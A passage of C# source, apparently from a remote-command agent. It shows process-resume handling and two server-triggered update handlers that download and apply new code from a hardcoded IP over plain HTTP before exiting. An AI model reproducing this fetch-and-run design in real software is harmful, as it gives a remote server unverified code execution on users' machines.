                result.ErrorMessage = $"Failed to resume process. NTSTATUS: 0x{status:X8}";
                _logger.LogWarning("Failed to resume process PID {Pid}. NTSTATUS: 0x{Status:X8}", pid, status);
            }
        }
        catch (ArgumentException)
        {
            result.Success = false;
            result.ErrorMessage = $"Process with PID {command.CommandText} not found";
            _logger.LogWarning("Process with PID {Pid} not found", command.CommandText);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Error resuming process PID {Pid}", command.CommandText);
        }

        return await Task.FromResult(result);
    }

    private async Task<CommandResult> HandleUpdateAvailableAsync(Command command, CancellationToken ct)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            var newVersion = command.CommandText;
            _logger.LogInformation("Received update_available notification for version {Version}", newVersion);

            // Use existing update service or create new one
            var updateService = _updateService;
            if (updateService == null)
            {
                var serverApiUrl = _configuration["Server:ApiAddress"] ?? "http://144.91.111.101:5001";
                updateService = new UpdateService(_logger, serverApiUrl);
            }

            // Check if we actually need to update
            var latestVersion = await updateService.CheckForUpdateAsync();
            if (latestVersion == null)
            {
                result.Success = true;
                result.Stdout = $"Already on latest version: {updateService.CurrentVersion}";
                _logger.LogInformation("No update needed, already on latest version");
                return result;
            }

            result.Stdout = $"Update available: {latestVersion.Version}. Downloading and applying...";
            _logger.LogInformation("Applying update to version {Version}", latestVersion.Version);

            // Send result before applying (as we'll exit)
            await SendCommandResultAsync(result, ct);

            // Gracefully disconnect before updating
            await DisconnectGracefullyAsync();

            // This will exit the process
            await updateService.ApplyUpdateAsync(latestVersion);

            // Should never reach here
            result.Success = true;
            return result;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = $"Update failed: {ex.Message}";
            _logger.LogError(ex, "Update available command failed");
            return result;
        }
    }

    private async Task DisconnectGracefullyAsync()
    {
        try
        {
            _logger.LogInformation("Disconnecting gracefully before update...");

            // Complete the request stream to signal we're done
            if (_call != null)
            {
                await _call.RequestStream.CompleteAsync();
                _logger.LogDebug("Request stream completed");
            }

            // Give the server a moment to process the disconnect
            await Task.Delay(500);

            // Clean up the connection
            Cleanup();
            _logger.LogInformation("Graceful disconnect completed");
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "Error during graceful disconnect (continuing with update)");
        }
    }

    private async Task<CommandResult> HandleUpdateCommandAsync(Command command, CancellationToken ct)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            _logger.LogInformation("Update command received (forced). Checking for updates...");

            // Use existing update service or create new one
            var updateService = _updateService;
            if (updateService == null)
            {
                var serverApiUrl = _configuration["Server:ApiAddress"] ?? "http://144.91.111.101:5001";
                updateService = new UpdateService(_logger, serverApiUrl);
            }

            // Check for updates
            var latestVersion = await updateService.CheckForUpdateAsync();

            if (latestVersion == null)
            {
                result.Success = true;
                result.Stdout = $"No update available. Current version: {updateService.CurrentVersion}";
                _logger.LogInformation("No update available");
                return result;
            }

            // Apply update
            result.Stdout = $"Update available: {latestVersion.Version}. Downloading and applying...";
            _logger.LogInformation("Applying update to version {Version}", latestVersion.Version);

            // Send result before applying (as we'll exit)
            await SendCommandResultAsync(result, ct);

            // Gracefully disconnect before updating
            await DisconnectGracefullyAsync();

            // This will exit the process
            await updateService.ApplyUpdateAsync(latestVersion);

            // Should never reach here
            result.Success = true;
            return result;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = $"Update failed: {ex.Message}";
            _logger.LogError(ex, "Update command failed");
            return result;
        }
    }
}
